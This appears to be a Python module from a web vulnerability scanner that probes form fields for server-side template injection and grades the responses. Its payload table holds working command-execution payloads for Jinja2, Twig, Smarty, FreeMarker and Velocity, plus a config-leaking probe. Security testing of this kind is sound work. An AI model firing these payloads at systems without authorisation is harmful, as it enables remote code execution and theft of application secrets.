import asyncio

class AdvancedSSTITester:
    """Advanced Server-Side Template Injection testing with context awareness"""
    
    def __init__(self):
        self.ssti_payloads = {
            'jinja2': [
                '{{7*7}}',
                '{{config}}',
                '{{request.application.__globals__.__builtins__.__import__(\"os\").popen(\"id\").read()}}'
            ],
            'twig': [
                '{{7*7}}',
                '{{_self.env.registerUndefinedFilterCallback(\"exec\")}}{{_self.env.getFilter(\"id\")}}'
            ],
            'smarty': [
                '{7*7}',
                '{php}echo `id`;{/php}'
            ],
            'freemarker': [
                '${7*7}',
                '<#assign ex=\"freemarker.template.utility.Execute\"?new()> ${ ex(\"id\") }'
            ],
            'velocity': [
                '#set($x=7*7)$x',
                '#set($rt = $x.class.forName(\"java.lang.Runtime\").getRuntime())#set($proc = $rt.exec(\"id\"))$proc.waitFor()'
            ],
            'generic': [
                '${7*7}',
                '#{7*7}',
                '%{7*7}',
                '{{7*7}}',
                '{7*7}'
            ]
        }
        
        self.detection_patterns = {
            '49': ['jinja2', 'twig', 'smarty', 'freemarker', 'velocity', 'generic'],  # 7*7 = 49
            'config': ['jinja2'],
            'uid=': ['command_execution'],
            'gid=': ['command_execution']
        }
    
    async def test_ssti_advanced(self, session, parameters):
        """Advanced SSTI testing with template engine detection"""
        findings = []
        
        for url, forms in parameters.items():
            for form in forms:
                for input_field in form['inputs']:
                    # Only test text-based inputs
                    if input_field['type'] in ['text', 'search', 'email', 'url', 'textarea']:
                        ssti_findings = await self._test_parameter_ssti(
                            session, form, input_field
                        )
                        findings.extend(ssti_findings)
        
        return findings
    
    async def _test_parameter_ssti(self, session, form, input_field):
        """Test individual parameter for SSTI vulnerabilities"""
        findings = []
        
        # Start with generic payloads to detect template engine
        detected_engine = await self._detect_template_engine(session, form, input_field)
        
        if detected_engine:
            # Use engine-specific payloads
            payloads = self.ssti_payloads.get(detected_engine, self.ssti_payloads['generic'])
        else:
            # Use generic payloads
            payloads = self.ssti_payloads['generic']
        
        for payload in payloads[:3]:  # Limit payloads
            try:
                data = {input_field['name']: payload}
                
                if form['method'].lower() == 'post':
                    async with session.post(form['action'], data=data) as response:
                        content = await response.text()
                        result = self._analyze_ssti_response(content, payload, form, input_field, detected_engine)
                        if result:
                            findings.append(result)
                            break  # Stop on first successful SSTI
                else:
                    params = {input_field['name']: payload}
                    async with session.get(form['action'], params=params) as response:
                        content = await response.text()
                        result = self._analyze_ssti_response(content, payload, form, input_field, detected_engine)
                        if result:
                            findings.append(result)
                            break  # Stop on first successful SSTI
                
                await asyncio.sleep(0.2)  # Rate limiting
                
            except Exception:
                continue
        
        return findings
    
    async def _detect_template_engine(self, session, form, input_field):
        """Detect the template engine being used"""
        # Test basic math expression
        test_payload = '{{7*7}}'
        
        try:
            data = {input_field['name']: test_payload}
            
            if form['method'].lower() == 'post':
                async with session.post(form['action'], data=data) as response:
                    content = await response.text()
            else:
                params = {input_field['name']: test_payload}
                async with session.get(form['action'], params=params) as response:
                    content = await response.text()
            
            # Check for template engine indicators
            if '49' in content:  # 7*7 = 49
                # Could be Jinja2, Twig, or others
                if 'jinja' in content.lower() or 'flask' in content.lower():
                    return 'jinja2'
                elif 'twig' in content.lower():
                    return 'twig'
                else:
                    return 'generic'
            
        except Exception:
            pass
        
        return None
    
    def _analyze_ssti_response(self, content, payload, form, input_field, detected_engine):
        """Analyze response for SSTI indicators"""
        # Check for mathematical evaluation
        if '49' in content and ('7*7' in payload or '{{7*7}}' in payload):
            severity = 'HIGH' if detected_engine else 'MEDIUM'
            return {
                'type': 'Server-Side Template Injection (SSTI)',
                'severity': severity,
                'url': form['action'],
                'parameter': input_field['name'],
                'payload': payload,
                'template_engine': detected_engine or 'unknown',
                'description': f'SSTI detected - mathematical expression evaluated (7*7=49)',
                'recommendation': 'Sanitize user input and avoid direct template rendering of user data'
            }
        
        # Check for config object access (Jinja2)
        if payload == '{{config}}' and ('SECRET_KEY' in content or 'DEBUG' in content):
            return {
                'type': 'SSTI Configuration Disclosure',
                'severity': 'HIGH',
                'url': form['action'],
                'parameter': input_field['name'],
                'payload': payload,
                'template_engine': 'jinja2',
                'description': 'SSTI allows access to application configuration',
                'recommendation': 'Implement strict input validation and template sandboxing'
            }
        
        # Check for command execution
        if any(indicator in content for indicator in ['uid=', 'gid=', '/bin/bash', '/bin/sh']):
            return {
                'type': 'SSTI Remote Code Execution',
                'severity': 'CRITICAL',
                'url': form['action'],
                'parameter': input_field['name'],
                'payload': payload,
                'template_engine': detected_engine or 'unknown',
                'description': 'SSTI allows remote code execution',
                'recommendation': 'Immediately patch SSTI vulnerability and review server security'
            }
        
        return None